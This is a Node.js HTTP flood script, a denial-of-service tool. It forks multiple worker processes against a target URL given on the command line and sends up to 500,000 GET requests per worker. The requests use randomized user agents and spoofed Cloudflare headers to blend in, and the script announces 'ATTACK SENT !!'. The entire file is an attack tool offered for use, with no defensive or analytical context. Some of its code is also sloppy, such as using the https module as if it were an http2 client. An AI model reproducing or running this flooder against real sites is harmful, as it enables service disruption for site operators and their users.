const fs = require('fs');
const url = require('url');
const http2 = require('http2');
const https = require('https');
const cluster = require('cluster');
const Bottleneck = require('bottleneck');

if (process.argv.length <= 3) {
    console.log(` [ HOST ] [ THREAD ] [ TIME ]`);
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var threads = process.argv[3];
var time = process.argv[4];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

let userAgents = [];
userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');

const generateUserAgent = () => {
    const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const operatingSystems = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS'];

    const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    const randomOS = operatingSystems[Math.floor(Math.random() * operatingSystems.length)];

    return `Mozilla/5.0 (${randomOS} NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}/91.0.4472.124 Safari/537.36`;
};

// Adjust the rate limit as needed
const totalRequests = 500000;
const requestsPerSecondLimit = 10000; // Set your desired limit

// Configure rate limiting with bottleneck
const limiter = new Bottleneck({
    maxConcurrent: requestsPerSecondLimit / 1000, // Convert requests per second to requests per millisecond
    minTime: 1 // Reduce the minimum time between requests to 1 millisecond
});

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(` ATTACK SENT !! `);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    startflood();
}

function startflood() {
    const client = parsed.protocol === 'https:' ? https : http2.connect(target);
    let requestsSent = 0;

    const intervalId = setInterval(() => {
        limiter.schedule(() => {
            if (requestsSent < totalRequests) {
                const headers = {
                    [http2.constants.HTTP2_HEADER_PATH]: '/',
                    [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                    'Host': parsed.host,
                    'Accept': '*/*',
                    'User-Agent': generateUserAgent(),
                    'Upgrade-Insecure-Requests': '1',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'Keep-Alive',
                    // Add Cloudflare-related headers
                    'cf-connecting-ip': '1.2.3.4', // Set a valid IP address
                    'cf-ipcountry': 'US',
                    'cf-ray': 'abcdef1234567890',
                    'cf-visitor': '{"scheme":"https"}',
                };

                const options = {
                    method: 'GET',
                    headers: headers,
                };

                const req = client.request(options);

                req.on('response', (headers) => {
                    // Handle response headers
                });

                req.on('data', (chunk) => {
                    // Handle response data
                });

                req.on('end', () => {
                    requestsSent++;
                    if (requestsSent >= totalRequests) {
                        clearInterval(intervalId);
                        client.close();
                    }
                });

                req.end();
            }
        });
    }, 1);
}

